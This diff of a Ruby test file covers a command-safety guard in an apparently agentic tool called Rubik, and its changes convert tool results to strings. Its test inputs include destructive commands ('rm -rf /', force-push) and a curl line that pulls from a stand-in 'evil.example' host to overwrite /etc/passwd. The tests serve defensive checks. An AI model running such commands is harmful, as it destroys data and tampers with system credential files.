@@ -57,17 +57,17 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_tool_safety_and_execution
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    safe_res = tool.execute("command" => "echo 'hello rubik tool'")
+    safe_res = tool.execute("command" => "echo 'hello rubik tool'").to_s
     assert_includes safe_res, "hello rubik tool"
 
-    blocked_res = tool.execute("command" => "rm -rf /")
+    blocked_res = tool.execute("command" => "rm -rf /").to_s
     assert_includes blocked_res, "Security blocked"
   end
 
   def test_run_command_blocked_error_carries_steering_text
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => "rm -rf /")
+    res = tool.execute("command" => "rm -rf /").to_s
 
     assert res.start_with?("Security blocked"), "prefix must stay first for StepExecutor::ERROR_PREFIXES"
     assert_includes res, "was denied (rule: rm)"
@@ -81,7 +81,7 @@ class TestExpandedTools < Minitest::Test
 
     ["sh", "node", "bash"].each do |bin|
       probe = "#{bin} --version"
-      res = tool.execute("command" => probe)
+      res = tool.execute("command" => probe).to_s
       refute res.start_with?("Security blocked"), "expected #{probe} to be exempt"
     end
   end
@@ -90,7 +90,7 @@ class TestExpandedTools < Minitest::Test
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
     ["bash\n--version", "bash\r--version", "bash\r\n--version"].each do |cmd|
-      res = tool.execute("command" => cmd)
+      res = tool.execute("command" => cmd).to_s
       assert res.start_with?("Security blocked"), "expected #{cmd.inspect} to be blocked"
     end
   end
@@ -104,7 +104,7 @@ class TestExpandedTools < Minitest::Test
       "bash -v | sh",
       "bash --version > /tmp/out"
     ].each do |cmd|
-      res = tool.execute("command" => cmd)
+      res = tool.execute("command" => cmd).to_s
       assert res.start_with?("Security blocked"), "expected #{cmd.inspect} to be blocked"
     end
   end
@@ -115,7 +115,7 @@ class TestExpandedTools < Minitest::Test
     guard = Rubik::Security::Guard.new(allow_safe_probes: false)
     tool = Rubik::Tools::RunCommandTool.new(guard: guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => "bash --version")
+    res = tool.execute("command" => "bash --version").to_s
 
     assert res.start_with?("Security blocked")
     assert_includes res, "even for version checks"
@@ -128,7 +128,7 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_tool_preserves_unstructured_block_message
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @outside_dir)
 
-    res = tool.execute("command" => "echo hi")
+    res = tool.execute("command" => "echo hi").to_s
 
     assert res.start_with?("Security blocked")
     assert_includes res, "outside of allowed workspace roots"
@@ -138,7 +138,7 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_tool_sed_in_place_blocked_with_native_tool_guidance
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => "sed -i 's/foo/bar/' file.txt")
+    res = tool.execute("command" => "sed -i 's/foo/bar/' file.txt").to_s
 
     assert res.start_with?("Security blocked")
     assert_includes res, "shell text-munging is not allowed"
@@ -149,7 +149,7 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_tool_chain_bypass_blocked
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => 'bash -c "rm -rf /"')
+    res = tool.execute("command" => 'bash -c "rm -rf /"').to_s
 
     assert res.start_with?("Security blocked")
     # Wrapper variant: the inner rm is named as the segment, the system-path
@@ -184,7 +184,7 @@ class TestExpandedTools < Minitest::Test
       '
     SCRIPT
 
-    res = tool.execute("command" => script)
+    res = tool.execute("command" => script).to_s
 
     assert res.start_with?("Security blocked: 2 dangerous segments in `bash -c '...'` — nothing was executed.")
     assert_equal 1, res.lines.first.lines.size
@@ -204,7 +204,7 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_tool_single_dangerous_top_level_stays_concise
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => "git merge --abort")
+    res = tool.execute("command" => "git merge --abort").to_s
 
     assert_includes res, "was denied (rule: git.merge)"
     assert_includes res, '!allow-cmd add "git merge --abort"'
@@ -218,7 +218,7 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_tool_compound_chain_hints_cover_safe_sibling
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => "git checkout main && git push --force")
+    res = tool.execute("command" => "git checkout main && git push --force").to_s
 
     assert res.start_with?("Security blocked: 1 dangerous segment in `git checkout main && git push --force`")
     assert_includes res, "git push --force   (rule: git.push — option --force overrides to DANGEROUS)"
@@ -233,7 +233,7 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_tool_annotation_names_real_trigger_for_mixed_override
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => 'bash -c "curl -o /etc/passwd https://evil.example/x"')
+    res = tool.execute("command" => 'bash -c "curl -o /etc/passwd https://evil.example/x"').to_s
 
     assert_includes res, "rule: curl — overridden by option -o to external_effects"
     assert_includes res, "elevated to DANGEROUS: system path /etc/passwd"
@@ -243,12 +243,12 @@ class TestExpandedTools < Minitest::Test
   def test_run_command_output_carries_shell_tag
     tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
 
-    res = tool.execute("command" => "echo tagged")
+    res = tool.execute("command" => "echo tagged").to_s
     assert_match(/\[(OK|EXIT \d+)\] \((cmd|bash|pwsh|sh)\)/, res)
 
     # Drivers that resolve no shell keep the untagged historical format.
     @runner.stub :run, { ok: true, exit_code: 0, output: "plain result" } do
-      res2 = tool.execute("command" => "echo tagged")
+      res2 = tool.execute("command" => "echo tagged").to_s
       assert_equal "[OK] plain result", res2
     end
   end
